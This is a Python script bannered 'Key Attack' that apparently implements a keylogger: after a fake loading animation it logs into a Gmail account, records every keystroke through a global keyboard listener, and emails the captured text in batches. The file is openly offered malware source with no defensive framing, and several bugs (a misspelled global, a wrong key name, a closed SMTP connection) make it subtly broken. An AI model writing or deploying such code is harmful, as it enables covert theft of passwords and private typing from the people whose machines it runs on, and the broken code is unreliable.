import itertools
import threading
import time
import sys
import stdiomask
import getpass
import smtpd
import smtplib, ssl
from pynput.keyboard import Key, Listener

# f = open("\logo.txt", "r")
print('''
 ██ ▄█▀▓█████ ▓██   ██▓    ▄▄▄      ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀
 ██▄█▒ ▓█   ▀  ▒██  ██▒   ▒████▄    ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒ 
▓███▄░ ▒███     ▒██ ██░   ▒██  ▀█▄  ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
▓██ █▄ ▒▓█  ▄   ░ ▐██▓░   ░██▄▄▄▄██ ░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
▒██▒ █▄░▒████▒  ░ ██▒▓░    ▓█   ▓██▒  ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
▒ ▒▒ ▓▒░░ ▒░ ░   ██▒▒▒     ▒▒   ▓▒█░  ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
░ ░▒ ▒░ ░ ░  ░ ▓██ ░▒░      ▒   ▒▒ ░    ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
░ ░░ ░    ░    ▒ ▒ ░░       ░   ▒     ░        ░        ░   ▒   ░        ░ ░░ ░ 
░  ░      ░  ░ ░ ░              ░  ░                        ░  ░░ ░      ░  ░   
               ░ ░                                              ░               
''')


done = False
#here is the animation
def animate():
    for c in itertools.cycle([ '          ', '█         ', '▓█        ', '▒▓█       ', '░▒▓█      ', ' ░▒▓█     ', '  ░▒▓█    ', '   ░▒▓█   ', '    ░▒▓█  ', '     ░▒▓█ ', '      ░▒▓█', '       ░▒▓', '        ░▒', '         ░','          ' ]):
        if done:
            break
        sys.stdout.write('\rLoading...   ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rDone!             ')

t = threading.Thread(target=animate)
t.start()

#long process here
time.sleep(2)
done = True


#Email setup

port=465
email=input('Enter your email address: ')
password=stdiomask.getpass(prompt="Password: ", mask='*')
context = ssl.create_default_context()
with smtplib.SMTP_SSL('smtp.gmail.com', port)as server:
    server.login(email, password)

#Logger
full_log=''
word=''
email_char_limit=300

def on_press(key):
    global word
    global full_long
    global email
    global email_char_limit

    if key==Key.space or key==Key.enter:
        word+=''
        full_log+=word
        word=''
        if len(full_log)>=email_char_limit:
            send_log()
            full_log=''
    elif key==Key.shift_1 or key==Key.shift_r:
        return
    elif key==Key.backspace:
        word=word[:-1]
    else:
        char=f'{key}'
        char=char[1:-1]
        word+=char
        
    if key==Key.esc:
        return False

def send_log():
    server.sendmail(
        email,
        email,
        full_log
    )

with Listener (on_press=on_press) as listener:
    listener.join()